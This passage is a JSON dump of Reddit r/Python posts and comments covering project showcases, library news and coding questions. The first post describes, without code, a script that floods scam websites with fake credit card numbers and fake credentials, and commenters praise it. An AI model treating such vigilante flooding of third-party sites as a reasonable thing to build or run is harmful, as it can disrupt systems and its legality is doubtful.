[
{
    "post_author": "Good_Doughnut8308",
    "post_id": "1do3dd2",
    "post_score": "692",
    "post_time": "Tuesday, June 25, 2024 at 2:08:03 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "scamming the scammers with python ",
    "media": [
        "https://github.com/IdanHajbeko/revenge_on_scammers/"
    ],
    "post_content": "Source code: https://github.com/IdanHajbeko/revenge_on_scammers/\nWhat my Project Does\nThis Python script sends numerous requests to scam websites using fake but valid credit card information. Each request incurs a small fee for the scammer's payment processor, making their scams costly. Additionally, it floods their login pages with fake usernames and passwords, making it harder for them to sift through and find real credentials.\nTarget Audience\nThis script is intended for people who have basic knowledge of Python(or advanced) and want to take down phishing scams.",
    "comments": [
        {
            "author": "aherok",
            "score": "253",
            "content": "I've got an improvement: you should not reinvent the wheel with generating fake names: https://faker.readthedocs.io/en/master/ ;)",
            "replies": [
                {
                    "author": "Good_Doughnut8308",
                    "score": "157",
                    "content": "I updated the code to use Faker it so much better thanks"
                },
                {
                    "author": "Good_Doughnut8308",
                    "score": "32",
                    "content": "i will use it thank you"
                }
            ]
        },
        {
            "author": "kuzmovych_y",
            "score": "92",
            "content": "Nice! I've done similar thing couple of years ago. The web page became inactive the next day.",
            "replies": [
                {
                    "author": "Good_Doughnut8308",
                    "score": "31",
                    "content": "The same happened to me after a little time he took the web down"
                }
            ]
        },
        {
            "author": "Entire-Club5012",
            "score": "50",
            "content": "with the increase in scams these days, this is a nifty project!"
        },
        {
            "author": "FluffyDuckKey",
            "score": "37",
            "content": "Neat but you totally need to look into faker. Takes care of all this for you. I used to smash post requests to these scam sites after my mum's partner lost a bundle of cash to them. Faker = Faker()!",
            "replies": [
                {
                    "author": "Good_Doughnut8308",
                    "score": "19",
                    "content": "I just updated the code to use Faker thanks"
                }
            ]
        },
        {
            "author": "DusikOff",
            "score": "27",
            "content": "Can I do some PRs? I want to improve it, and make this thing to work with more website with login/payments forms autodetection?"
        },
        {
            "author": "Th0ught01",
            "score": "23",
            "content": "Least give credit to the man who probably inspired this - https://www.youtube.com/watch?v=StmNWzHbQJU I don't want to accuse you of copying but all your comments are very close to his"
        }
    ]
},
{
    "post_author": "iEslam",
    "post_id": "g53lxf",
    "post_score": "12342",
    "post_time": "Tuesday, April 21, 2020 at 2:11:39 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Lad wrote a Python script to download Alexa voice recordings, he didn't expect this email.",
    "media": [
        "https://i.redd.it/2s0dj8ob12u41.png",
        "https://preview.redd.it/2s0dj8ob12u41.png?width=640&crop=smart&auto=webp&s=c0e050eb8d0aabb9e8d472cbb2f34e0ff7d74f40"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Konquest",
            "score": "1858",
            "content": "I’ll be honest, I was expecting a Cease and Desist from Amazon.",
            "replies": [
                {
                    "author": "seismatica",
                    "score": "203",
                    "content": "omg me too!",
                    "replies": [
                        {
                            "author": "ohsnapdragons",
                            "score": "42",
                            "content": "I as well haha"
                        },
                        {
                            "author": "valentinacode",
                            "score": "26",
                            "content": "me too haha"
                        }
                    ]
                }
            ]
        },
        {
            "author": "querymcsearchface",
            "score": "263",
            "content": "Very cool. That’s the beauty of sharing. You never know who or how it will help someone, but you post it anyway because that’s just being awesome. Thanks for sharing."
        },
        {
            "author": "iEslam",
            "score": "217",
            "content": "This was posted publicly by Michael Haephrati on Facebook. Update: The lad is a Redditor! u/haephrati Update: The lad turned it into a Software!"
        },
        {
            "author": "cogFrog",
            "score": "64",
            "content": "I feel that. It must be gratifying to do some good in the world, even if by accident. To diminish another's suffering just a little bit. RIP Mrs. Roberts."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dromws",
    "post_score": "15",
    "post_time": "Sunday, June 30, 2024 at 3:00:07 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Altruistic-Track-279",
            "score": "9",
            "content": "I had this Python Crash Course book sitting on my desk that I took from my brother in law. I finally read the first chapter and wrote a code to display a quote. I couldn't get it to display the quote with the quotation marks but I was able to figure it out and I got excited. I'm looking forward to whatever I learn from this book.",
            "replies": [
                {
                    "author": "Ok-Frosting7364",
                    "score": "3",
                    "content": "Great book!"
                }
            ]
        },
        {
            "author": "lilbud2000",
            "score": "6",
            "content": "Been working on a web scraping project to grab information about live concerts (including setlists, and stats on songs played/other info). I had a first version but went back and realized I could do plenty of stuff better. The data was grabbed using BeautifulSoup, and after a *ton* of cleaning, was stored in an SQLite database. I'm also working on a Discord bot (using Discord.py) that interacts with the database. Same as above I have a first version but am planning on rewriting so it's easier to maintain/add new features and commands. Currently working on switching the database to Postgres locally. I host the bot on Heroku and push the SQLite database to Postgres. I figure it would be much easier to have Postgres on both ends (least I hope anyway)."
        },
        {
            "author": "brennancurrier",
            "score": "5",
            "content": "Learning PyQt for an application idea I’ve had for months and using rust with python bindings for the more performance oriented functions within the application. It’s ultimately gonna be a texture converter for DDS, BMP, TGA and PNG files because I don’t like the currently available ones"
        },
        {
            "author": "Ok-Frosting7364",
            "score": "5",
            "content": "I just release a Python package for getting space weather data and now I'm focused on making a similar package but for my local library database."
        },
        {
            "author": "ace_hawk5",
            "score": "4",
            "content": "Learning how to use pandas"
        },
        {
            "author": "autreblackschtuff",
            "score": "3",
            "content": "Working on an a tool to run OCR on video frames (or subframes) at a predefined interval. Pretty much a complete rewrite from previous effort, which was basically one big class, and using streamlit as front-end. Went away, took some classes, read some books. Now I have it setup as a generator pipeline, and thinking of putting together front-end with flet (just to try it out really)."
        },
        {
            "author": "damir_lukianenko",
            "score": "3",
            "content": "Hey guys, I'm a Python developer ready to help with your Python or JavaScript projects and troubleshoot any issues. I'm also looking for someone to practice English with, so this could be a great exchange for both of us. Feel free to write me"
        },
        {
            "author": "fohrloop",
            "score": "3",
            "content": "Writing a personal website using the static site generator called Pelican. At the moment finalizing the templates which are written in Jinja+CSS."
        },
        {
            "author": "Wooden_Prior1832",
            "score": "3",
            "content": "Trying to make a CLI operating system simulator from the 90's with some cool sound effects and visuals, centered around an AI thing that is supposed to handle everything going on. I used pyGame for sound effects, and cool-retro-terminal for the looks."
        }
    ]
},
{
    "post_author": "TheInsaneApp",
    "post_id": "gzila7",
    "post_score": "4586",
    "post_time": "Tuesday, June 9, 2020 at 10:52:27 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Python 3 in One Pic",
    "media": [
        "https://i.redd.it/dixavkhibu351.png",
        "https://preview.redd.it/dixavkhibu351.png?width=640&crop=smart&auto=webp&s=9dd730dd8089810e7413911c4b38e4840299d4f1"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "613",
            "content": "",
            "replies": [
                {
                    "author": "hughperman",
                    "score": "190",
                    "content": ""
                },
                {
                    "author": "hoppla1232",
                    "score": "30",
                    "content": ""
                }
            ]
        },
        {
            "author": "iBlag",
            "score": "117",
            "content": ""
        }
    ]
},
{
    "post_author": "defrostcookies",
    "post_id": "1dt5far",
    "post_score": "0",
    "post_time": "Tuesday, July 2, 2024 at 1:03:20 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Which solution is more Pythonic?",
    "media": [],
    "post_content": "Solving the \"Printing triangles Problem\" and want to know which is more pythonic:\nsymbol = \"*\"\nemptySpace \" \"\n\nheight = int(input(\"How many layers should the triangle have?\"))\n\ndef build_a_triangle(layers):\n    buildable_layers = list(range(0, layers + 1))\n    layer_stuffing = list(reversed(buildable_layers))\n    ordered_pairs = list(zip(buildable_layers, layer_stuffing))\n    for layer, stuffing in ordered_pairs:\n        print((emptySpace * stuffing) + (symbol + emptySpace) * layer)\n\ndef triangle(n):                           # Not my code\n    k = n - 1                              # Still not my code\n    for i in range(0, n):                  # Still not my code\n        for j in range(0, k):              # Still not my code\n            print(end=\" \")                 # Still not my code\n        k -= 1                             # Still not my code\n        for j in range(0, i+1):            # Still not my code\n            print(\"* \", end=\"\")            # Still not my code\n        print(\"\\n\")                        # End not my code\n\nbuild_a_triangle(height)\ntriangle(height)                            #calling Not my code",
    "comments": [
        {
            "author": "commy2",
            "score": "48",
            "content": "def print_triangle(height): for stars in range(1, height + 1): spaces = height - stars print(\" \" * spaces + \" \".join(\"*\" * stars)) print_triangle(6)",
            "replies": [
                {
                    "author": "JennaSys",
                    "score": "16",
                    "content": "Neither of the two above is all that Pythonic. This one is."
                },
                {
                    "author": "cantux",
                    "score": "3",
                    "content": "```print(\" \" * spaces + (\"* \" * stars))```"
                },
                {
                    "author": "roenthomas",
                    "score": "2",
                    "content": "I'm trying to figure out how join is used here, relative to just concatenation using the following code: def print_triangles(height): for stars in range(1, height + 1): print(\" \" * (height-stars) + \"*\" + (\" *\")*(stars-1)) especially in the first line of the triangle when only one star is printed EDIT: Never mind, I get it now by reading through the join() method documentation and running through some examples."
                }
            ]
        },
        {
            "author": "fiskfisk",
            "score": "13",
            "content": "The first has too many indirect levels of context you have to keep in your head while reading the code, while the second one only needs the context above or after the line you're reading. The second one is preferable."
        },
        {
            "author": "Echleon",
            "score": "3",
            "content": "I don’t see how the first one would be considered any more pythonic. I don’t see it doing anything that wouldn’t be done in another language. It’s definitely less readable though and is overcomplicating a simple problem."
        },
        {
            "author": "Mysterious-Rent7233",
            "score": "3",
            "content": "I think you do more conversions to list() than are needed."
        },
        {
            "author": "the_hoser",
            "score": "7",
            "content": "I like the first one, but you really don't need to consume those iterators into lists at each step. Don't fear the generator :) I don't know about \"Pythonic\", though. I'm not even sure what that means, these days."
        },
        {
            "author": "fortunatefaileur",
            "score": "0",
            "content": "The first is inscrutable, so … It’s also sort of dumb to argue about, since you could make the code more efficient and clear by just deleting it - arguing about the qualities of toy code doesn’t really give you lot of clarity on what matters for Real Code that has complexity and life cycle and multiple readers and writers over time."
        }
    ]
},
{
    "post_author": "BluesFiend",
    "post_id": "1dndyxb",
    "post_score": "8",
    "post_time": "Monday, June 24, 2024 at 4:50:48 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "changelog_gen: Conventional commits + bump version",
    "media": [
        "https://nrwldev.github.io/changelog-gen/",
        "https://www.conventionalcommits.org/en/v1.0.0/",
        "https://pypi.org/project/changelog_gen/",
        "https://github.com/NRWLDev/changelog-gen",
        "https://git-cliff.org/"
    ],
    "post_content": "changelog-gen is a CHANGELOG generator intended to be used in conjunction with bump-my-version to generate changelogs and create release tags from conventional commit formatted commit messages. Hope this can provide some improvement to some developers lives, or if its missing any glaring features, please do drop a line or raise an issue.\nCode: https://github.com/NRWLDev/changelog-gen\nDocs: https://nrwldev.github.io/changelog-gen/\nPypi: https://pypi.org/project/changelog_gen/\nWhat my project does\nchangelog-gen parses commit messages (since previous release) and extracts those formatted using conventional formatting. Based on those changes it will then bump version with the correct semver, and generate a changelog entry for the new release.\nTarget audience\nAny developer that is working with code that can benefit from a clear track of changes within releases.\nComparison\nThere is git-cliff which some recent inspriration has been drawn from, but that does not tie in with bump-version to provide automated semver detection. Nor does it inherently support pyproject.toml support.",
    "comments": [
        {
            "author": "zeitgeistmao",
            "score": "2",
            "content": ""
        },
        {
            "author": "cediddi",
            "score": "2",
            "content": "\"I'm going through changes\" - 🐍",
            "replies": [
                {
                    "author": "BluesFiend",
                    "score": "2",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "monorepo",
    "post_id": "1dtxqph",
    "post_score": "42",
    "post_time": "Wednesday, July 3, 2024 at 12:50:07 AM GMT+3",
    "flair_text": "Official PyCon",
    "post_title": "PyCon US 2024 | All recorded content now available!",
    "media": [],
    "post_content": "Official PyCon",
    "comments": []
},
{
    "post_author": "nginx26",
    "post_id": "1ds33vs",
    "post_score": "13",
    "post_time": "Sunday, June 30, 2024 at 5:46:07 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Stockdex: Python Package to Extract Financial data From Multiple Sources",
    "media": [
        "https://pypi.org/project/stockdex/",
        "https://github.com/ahnazary/stockdex"
    ],
    "post_content": "Happy Weekend every one!\nHere to showcase stockdex, a Python package that provides an interface to access financial data (e.g revenue, cash flow ...) from data sources such as:\nYahoo Finance API\nYahoo Finance website\nDigrin website\nMacrotrends website\nJustETF website (EU etf data)\nData is returned as a pandas DataFrame and it functions similar to yfinance python package.\nComparison with yfinance\nWith stockdex, one can access data from multiple sources (not just Yahoo Finance) and unlike yahoo finance which provides only data from last 4 years, stockdex provides data from multiple sources and in some cases, data from the beginning of the stock's existence (e.g macrotrends and digirin have older than 4 years data).\nTarget audience\nPeople who are interested in financial data and familiar with python programming language.\nReferences\nFor more details or to contribute, feel free to visit the links below:\nGithub Repo Link\nPypi link",
    "comments": [
        {
            "author": "Fluid_Willow_8758",
            "score": "2",
            "content": "Excellent project; it would be interesting to see more eta and bond backing."
        },
        {
            "author": "AH1376",
            "score": "1",
            "content": "Cool project, some more etf and bonds support would be interesting.",
            "replies": [
                {
                    "author": "nginx26",
                    "score": "1",
                    "content": "Thanks. I will look into it for next versions."
                }
            ]
        }
    ]
},
{
    "post_author": "Krukerfluk",
    "post_id": "hoolsm",
    "post_score": "9236",
    "post_time": "Friday, July 10, 2020 at 4:06:13 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "This post has:",
    "media": [],
    "post_content": "9777 upvotes,\n967 downvotes\nand 452 comments!",
    "comments": [
        {
            "author": "[deleted]",
            "score": "1319",
            "content": "scale tap piquant quiet advise salt languid abundant dolls long -- mass edited with redact.dev",
            "replies": [
                {
                    "author": "Krukerfluk",
                    "score": "486",
                    "content": "yep",
                    "replies": [
                        {
                            "author": "Jac0b_0",
                            "score": "86",
                            "content": "Adding number of cross posts would be cool",
                            "replies": [
                                {
                                    "author": "steampunkgibbon",
                                    "score": "46",
                                    "content": "would be levels more challenging too"
                                }
                            ]
                        },
                        {
                            "author": "mydaddyhurtsme",
                            "score": "2",
                            "content": "yup cock"
                        }
                    ]
                }
            ]
        },
        {
            "author": "SpontaneousAge",
            "score": "406",
            "content": "Good job. But honestly, add a sleep timer of a few seconds. This will eventually get your IP banned on reddit if you bombard them with too many requests.",
            "replies": [
                {
                    "author": "throwaway_the_fourth",
                    "score": "165",
                    "content": "The API wrapper (PRAW) takes care of that. No need to add additional sleeps."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "115",
            "content": "Cool! Could you share it?"
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1do71es",
    "post_score": "263",
    "post_time": "Tuesday, June 25, 2024 at 5:14:48 PM GMT+3",
    "flair_text": "News",
    "post_title": "GeoPandas 1.0 released!",
    "media": [
        "http://pandas.pydata.org/",
        "https://pyogrio.readthedocs.io/",
        "https://github.com/geopandas/geopandas/milestone/4?closed=1",
        "https://github.com/geopandas/geopandas/releases/tag/v1.0.0",
        "https://github.com/geopandas/geopandas/issues/3201",
        "https://geopandas.org/en/latest/docs/changelog.html",
        "https://shapely.readthedocs.io/",
        "http://matplotlib.org/"
    ],
    "post_content": "A good 10 years after it's first 0.1 release, GeoPandas just tagged their 1.0 release!\nRelease page: https://github.com/geopandas/geopandas/releases/tag/v1.0.0\nChangelog: https://geopandas.org/en/latest/docs/changelog.html\n1.0 tracking issue: https://github.com/geopandas/geopandas/issues/3201\n1.0 milestone: https://github.com/geopandas/geopandas/milestone/4?closed=1\nAbout GeoPandas\nGeoPandas is an open source project to make working with geospatial data in python easier. GeoPandas extends the datatypes used by pandas to allow spatial operations on geometric types. Geometric operations are performed by shapely. Geopandas further depends on pyogrio for file access and matplotlib for plotting.",
    "comments": [
        {
            "author": "Quick-Profession9077",
            "score": "46",
            "content": "Wow, as someone that uses GeoPandas a fair amount there are quite a number of additions in this update. Certainly fitting that it is a v1. Thanks to everyone that works hard on improving this library, it is a great resource!"
        },
        {
            "author": "yrubooingmeimryte",
            "score": "103",
            "content": "Wait, this post isn’t about polars! Someone arrest OP!",
            "replies": [
                {
                    "author": "Daddy_data_nerd",
                    "score": "33",
                    "content": "We can call it GeoPolars... It'll be in sub 1.0.0 status for ten more years.",
                    "replies": [
                        {
                            "author": "-Legen-",
                            "score": "16",
                            "content": "GeoPolars It already exists https://github.com/geopolars/geopolars",
                            "replies": [
                                {
                                    "author": "sinnayre",
                                    "score": "8",
                                    "content": "It’s an alpha version that’ll probably break in prod."
                                },
                                {
                                    "author": "Daddy_data_nerd",
                                    "score": "5",
                                    "content": "Well... I guess here's to waiting 10 more years for 1.0!"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "nemom",
            "score": "12",
            "content": "Mazel tov!"
        },
        {
            "author": "Electronic_Spell_337",
            "score": "3",
            "content": "Gotta check this out for my flask app cheers!"
        },
        {
            "author": "commenterzero",
            "score": "2",
            "content": "Yay"
        },
        {
            "author": "Fastestlastplace",
            "score": "1",
            "content": "Hooray!"
        },
        {
            "author": "pppossibilities",
            "score": "1",
            "content": "If I already have pandas as a project dependency, how much more would adding geopandas introduce?",
            "replies": [
                {
                    "author": "JimiThing716",
                    "score": "4",
                    "content": "Off the top of my head: Fiona, shapely, pyproj, rtree"
                }
            ]
        },
        {
            "author": "El_Minadero",
            "score": "1",
            "content": "Yaaaay!! Hopefully its dependencies are compatible with pyvista"
        },
        {
            "author": "Hot_Satisfaction_333",
            "score": "1",
            "content": "Glad that it finally came out! I was seriously tired of using 0.1 release for 8 years straight 😂"
        }
    ]
},
{
    "post_author": "gofiend",
    "post_id": "1du7myj",
    "post_score": "2",
    "post_time": "Wednesday, July 3, 2024 at 9:29:22 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What change in Python 3.12 is so hard for deep learning frameworks to support?",
    "media": [],
    "post_content": "I noticed that both Pytorch and Tensorflow don't support Python 3.12 yet. It's obviously not a big deal, but I'm curious. What changed in 3.12 that is so difficult to support? Should we expect this sort of n-1 issue at every point release?",
    "comments": [
        {
            "author": "riklaunim",
            "score": "1",
            "content": "It takes time to test and verify that your software works with newer dependencies. You don't really have to use 3.12 the day it's released, especially when your work depends on big and complex software stacks.",
            "replies": [
                {
                    "author": "gofiend",
                    "score": "1",
                    "content": "Python 3.12 came out October 2, 2023! The latest Ubuntu has adopted it already! I mean don't get me wrong, it's not an issue, but I'm curious about the techical details that are making this hard. I vaguely recall previous versions of python were supported faster.",
                    "replies": [
                        {
                            "author": "riklaunim",
                            "score": "1",
                            "content": "If you want direct answers then check PyTorch or Tensorflow issue trackers.",
                            "replies": [
                                {
                                    "author": "Mehdi2277",
                                    "score": "1",
                                    "content": "For tensorflow while it is open source maintained the repo is mirror of google internal repo and a lot of development happens in google first and then is updated later. As side effect a lot of pr history/review history does not exist for tf. Similarly while issue tracker is used my experience there is if you really want something done with tf you want to have google contacts."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Mehdi2277",
            "score": "1",
            "content": "There are number of libraries in tf ecosystem like tensorflow transform/tfx-bsl/etc that are still at 3.10 as latest supported version. I’ve done last 2 python upgrades for my department. The biggest reason really is lowish priority. I’m less sure on PyTorch, but tensorflow is mainly maintained by google and they are moving towards jax and doing less work on tf. Adding support for new python version is mostly case of when someone in google feels like it or they get pushed to do it by another company that has strong enough relationship. My current company spends hundreds of millions on gcp and we have made support requests include library related upgrades where the library version for some service may have been behind for months but after we had need for it and asked we got it couple weeks later."
        }
    ]
},
{
    "post_author": "CompetitiveBed",
    "post_id": "1do51jk",
    "post_score": "0",
    "post_time": "Tuesday, June 25, 2024 at 3:41:36 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I am building a reverse job board for python developers!",
    "media": [
        "http://pythondevs.co/",
        "https://thisisrahmat.com/",
        "https://tally.so/r/waxr2q",
        "https://pythondevs.co/"
    ],
    "post_content": "Hi all, my name is Rahmat and I am building Pythondevs.co the reverse job board for python engineers.\nI have been working in the tech industry for 5 years now and I have found job searching to be such a drag, I find myself just sending many applications waiting to hear back from companies who end up ghosting a lot of the time.\nPythonDevs is flipping the script and gives the power to developers.\nInstead of chasing opportunities, you can showcase your skills and let companies chase you! Here's how it works:\nCreate a profile: Highlight your Python expertise, experience, and passion projects.\nCompanies reach out directly: We connect you with top companies searching for top Python talent.\nLand your dream gig: Negotiate offers and choose the perfect fit for your next coding adventure.\nIf you're interested add your profile. I would love to help you find your next gig!\nif you have any questions please feel free to message me privately or comment below, I am very open to feedback!\nhttps://pythondevs.co/",
    "comments": [
        {
            "author": "jeromymanuel",
            "score": "8",
            "content": "If you can connect devs with top companies then why are you struggling with applications yourself?",
            "replies": [
                {
                    "author": "velo_sprinty_boi_",
                    "score": "1",
                    "content": "Damn you and your logic."
                }
            ]
        },
        {
            "author": "HK_0066",
            "score": "4",
            "content": "bad gateway response on these links dude register me though",
            "replies": [
                {
                    "author": "CompetitiveBed",
                    "score": "2",
                    "content": "Hi Yes it crashed right after I wrote that post *face-palms* but I have fixed it now and it's all good. You should be able to access the site: https://pythondevs.co/ Thanks for the patience, it's in public beta I am still putting in the finishin touches but I hope you find the site useful. Rahmat"
                }
            ]
        },
        {
            "author": "Pudding92",
            "score": "2",
            "content": "Is it written in Python?",
            "replies": [
                {
                    "author": "Astralnugget",
                    "score": "3",
                    "content": "It’d be cool if devs could have colab notebook type environments on their profile where visitors can interact with stuff the dev has made"
                },
                {
                    "author": "ThreeChonkyCats",
                    "score": "1",
                    "content": "That would be ironic."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Hi Yes it crashed right after I wrote that post *face-palms* but I have fixed it now and it's all good. You should be able to access the site: https://pythondevs.co/ Thanks for the patience, I hope you find the site useful. Rahmat",
            "replies": [
                {
                    "author": "CompetitiveBed",
                    "score": "1",
                    "content": "Hi Yes it crashed right after I wrote that post *face-palms* but I have fixed it now and it's all good. You should be able to access the site: https://pythondevs.co/ Thanks for the patience, I hope you find the site useful. Rahmat"
                }
            ]
        },
        {
            "author": "riklaunim",
            "score": "1",
            "content": "Reverse job board, reverse Tinder, is called LinkedIn :)"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dnsczh",
    "post_score": "0",
    "post_time": "Tuesday, June 25, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "RevolutionaryPen4661",
    "post_id": "1ds7q2l",
    "post_score": "3",
    "post_time": "Sunday, June 30, 2024 at 9:15:21 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Possibility of Integration as a local web app using FastAPI and Tauri",
    "media": [],
    "post_content": "I have some questions regarding the new Reflex framework which is based on FastAPI. We know that Tauri is a great tool for building desktop apps with low bundle size and performance. I am thinking about the possibility of automatic integration. If the app runs locally, it would have System Level APIs + Better UI (Can be used with many UI libraries like Chakra, shadcn/ui, magicui.design) + Smaller Bundle (Tauri). So it would be a great stack for building apps for both web and desktop in the same codebase. According to you, what would be the steps should you take to make one like this? Are maturin and PyO3 required? (It would be great if we don't pollute the reflex for this, rather making a template instead)\nLimitation\nYou can't build mobile apps in the future unless you're using your server, which hike the sky with the cost. If you're doing this, there is no reason to use Tauri + FastAPI. Just use Reflex then.",
    "comments": [
        {
            "author": "silent_guy1",
            "score": "1",
            "content": "it seems like you already have a reflex app written and you are looking to bundle it for installation. You can possible try pyinstaller. But if you were writing it from scratch, nicegui ( https://nicegui.io/documentation/section_configuration_deployment#package_for_installation ) is really good for this use case.",
            "replies": [
                {
                    "author": "RevolutionaryPen4661",
                    "score": "1",
                    "content": "No, the size of the compiled binary will be too high. It would be a great idea if we could somehow use web views without increasing the size of an app. A simple todo app can be 150 MB."
                }
            ]
        }
    ]
},
{
    "post_author": "jessjwilliamson",
    "post_id": "gftejm",
    "post_score": "7864",
    "post_time": "Friday, May 8, 2020 at 4:39:09 PM GMT+3",
    "flair_text": "",
    "post_title": "I redesign the Python logo to make it more modern",
    "media": [
        "https://i.redd.it/rxezjyf4ojx41.png",
        "https://preview.redd.it/rxezjyf4ojx41.png?width=640&crop=smart&auto=webp&s=61f4647f327a1fee4554b82965cc8b2e8b208c4f"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "PositiveExia",
            "score": "322",
            "content": "Looks fantastic. I would vote for this redesign any day",
            "replies": [
                {
                    "author": "waykiki13",
                    "score": "36",
                    "content": "Totally agree, wish he'd submit it to the PSF, who knows, maybe we even witnessed the birth of python 4.0",
                    "replies": [
                        {
                            "author": "jessjwilliamson",
                            "score": "65",
                            "content": "I sent them an email yesterday :) p.s. I'm a lady! :D My name is Jessica!"
                        }
                    ]
                }
            ]
        },
        {
            "author": "mrswats",
            "score": "718",
            "content": "Looks really cool! You should submit it to the PSF :)",
            "replies": [
                {
                    "author": "CeeMX",
                    "score": "177",
                    "content": "Propose it in a PEP"
                }
            ]
        },
        {
            "author": "jessjwilliamson",
            "score": "322",
            "content": "Original portfolio here: https://www.behance.net/gallery/96750899/Python-Logo-Redesign"
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "1dobox5",
    "post_score": "26",
    "post_time": "Tuesday, June 25, 2024 at 8:31:44 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "FleetTrack - A vehicle fleet tracking application. (FastAPI, Kafka, Metabase) ",
    "media": [
        "https://github.com/pratik-choudhari/FleetTrack"
    ],
    "post_content": "What my project does\nFleetTrack is an application focused on collection, storage and analytics of realtime data received from vehicles.\nGithub: https://github.com/pratik-choudhari/FleetTrack\nTarget Audience\nI built this as a portfolio project\nComparison\nI did not find any alternatives. Whatever is available is closed source.\nI created this project to showcase my data engineering skills. I would love any feedback for features I can add into this project!",
    "comments": [
        {
            "author": "vantasmer",
            "score": "5",
            "content": "Super cool! Would be interesting to incorporate time series data into grafana too. How are you sending the data from the vehicles to your FastAPI endpoint?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "3",
                    "content": "Hey thanks for the idea! I will look into it. The data transfer is like a normal REST API call.",
                    "replies": [
                        {
                            "author": "vantasmer",
                            "score": "1",
                            "content": "What is the system that runs on the vehicles that makes that API call? Is it like a small usb powered micro-computer?",
                            "replies": [
                                {
                                    "author": "[deleted]",
                                    "score": "4",
                                    "content": "In this project, I am simulating vehicles through a script. This script creates a process per vehicle and these processes do the REST API call. In the real world, I think it will be an embedded computer able to connect to the Internet."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "RevolutionaryEbb1206",
            "score": "2",
            "content": "Very interesting idea. Based on the UI it looks like there already is a 'dark mode' lol. What about additional technical service information for each of the vehicles (coolant, oil, tire pressures etc)? Also, is there tracking or a visual indication of completeness for each job? (e.g. a truck goes from the factory-A to the destination-B and is halfway there so that the vehicle shows 50% job completion, based on it's relative geographic data)",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "1",
                    "content": "Those are some really cool ideas, I do not know what all piece of information can a vehicle send back to the server, there is some module which does all this right?"
                },
                {
                    "author": "axonxorz",
                    "score": "1",
                    "content": "Based on the UI it looks like there already is a 'dark mode' lol. So many frontend frameworks bring that \"for free\" these days."
                }
            ]
        }
    ]
},
{
    "post_author": "fpgmaas",
    "post_id": "1dtov0u",
    "post_score": "22",
    "post_time": "Tuesday, July 2, 2024 at 6:39:00 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "pypiscout.com – A search engine for Python packages based on vector embeddings",
    "media": [
        "https://pypiscout.com/",
        "https://koaning.io/posts/search-boxes/"
    ],
    "post_content": "Finding the right Python package on PyPI can be a bit difficult, since PyPI isn't really designed for discovering packages easily. For example, you can search for the word \"plot\" and get a list of hundreds of packages that contain the word \"plot\" in seemingly random order.\nInspired by this blog post about finding arXiv articles using vector embeddings, I decided to build a small application that helps you find Python packages with a similar approach. For example, you can ask it \"I want to make nice plots and visualizations\", and it will provide you with a short list of packages that can help you with that.\nYou can try it out at https://pypiscout.com",
    "comments": [
        {
            "author": "AustinCorgiBart",
            "score": "5",
            "content": "On the one hand, I'm happy that searching for \"web development\" puts my project as #7. On the other hand, not great that Flask, Django, and the other million better options don't show up before it. The ones that do show up... Not sure about the results lol.",
            "replies": [
                {
                    "author": "fpgmaas",
                    "score": "6",
                    "content": "Good point! I found it difficult to balance popularity and similarity to get the most relevant results. Currently it finds the 100 most similar descriptions in the top 100,000 packages, and filters this. This worked relatively well for my tests, but for a more generic query like 'web framework' there are apparently too many close matches based on just the description. Thanks for the feedback, I will definitely use this example to try and approve the app! EDIT: I think there is something wrong with the query I use to fetch the data from BigQuery... To be continued."
                }
            ]
        },
        {
            "author": "danalvares",
            "score": "1",
            "content": "Loved it <3"
        }
    ]
},
{
    "post_author": "partev",
    "post_id": "1dnq01p",
    "post_score": "0",
    "post_time": "Tuesday, June 25, 2024 at 1:13:09 AM GMT+3",
    "flair_text": "News",
    "post_title": "Announcement: PyData Yerevan Open Source pandas Sprint (June 25)",
    "media": [
        "https://newsroom.aua.am/event/pydata-yerevan-open-source-pandas-sprint/"
    ],
    "post_content": "https://newsroom.aua.am/event/pydata-yerevan-open-source-pandas-sprint/",
    "comments": [
        {
            "author": "yrubooingmeimryte",
            "score": "2",
            "content": "This post isn’t about polars. Is it allowed on this sub or does OP need to be punished with physical violence?",
            "replies": [
                {
                    "author": "afreydoa",
                    "score": "1",
                    "content": "Sprint is probably about making pandas to be more like polars, so its allowed."
                }
            ]
        }
    ]
},
{
    "post_author": "backprop88",
    "post_id": "7kpme8",
    "post_score": "6722",
    "post_time": "Tuesday, December 19, 2017 at 3:47:56 AM GMT+3",
    "flair_text": "",
    "post_title": "Automate the boring stuff with python - tinder",
    "media": [
        "https://gfycat.com/PointlessSimplisticAmericanquarterhorse"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
